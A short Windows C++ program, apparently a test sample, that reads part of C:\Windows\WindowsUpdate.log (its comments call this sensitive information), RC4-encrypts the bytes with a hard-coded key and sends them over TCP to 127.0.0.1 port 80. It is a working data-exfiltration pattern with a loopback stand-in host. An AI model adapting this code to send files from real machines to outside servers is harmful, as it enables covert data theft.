// WinNetTest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "RC4.h"

int _tmain(int argc, _TCHAR* argv[])
{
	/************************************************************************/
	/*			Define the data buffer                                      */
	/************************************************************************/
	char buf[1025];
	int errorcode;

	/************************************************************************/
	/*			Read sensitive information from system file                 */
	/************************************************************************/
	FILE *fd = fopen("C:\\Windows\\WindowsUpdate.log","r");
	fread(buf,sizeof(char),sizeof(buf)-1,fd);
	buf[1024] = 0;

	/************************************************************************/
	/*          Encrypt the data to be sent                                 */
	/************************************************************************/
	char ebuf[1025];
	RC4("key",buf,ebuf,3,sizeof(ebuf)-1);
	ebuf[1024] = 0;

	/************************************************************************/
	/*         Construct the connection to the server                       */
	/************************************************************************/
	WSADATA wsaData;
	SOCKET s;
	SOCKADDR_IN ServerAddr;
	int Port = 80;
	
	WSAStartup(MAKEWORD(2,2), &wsaData);
	
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(Port); 
	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	
	int concode = connect(s, (SOCKADDR *) &ServerAddr, sizeof(ServerAddr)); 
	
	if (concode)
	{
		printf("The connection is failed\n");
	}
	else
	{
		printf("Successfully construct the connection\n");
	}

	/************************************************************************/
	/*			Send the data to the server                                 */
	/************************************************************************/
	errorcode = send(s,ebuf,sizeof(ebuf),0);
	printf("The return code is %d\n",errorcode);
	closesocket(s);

	WSACleanup();

	return 0;
}

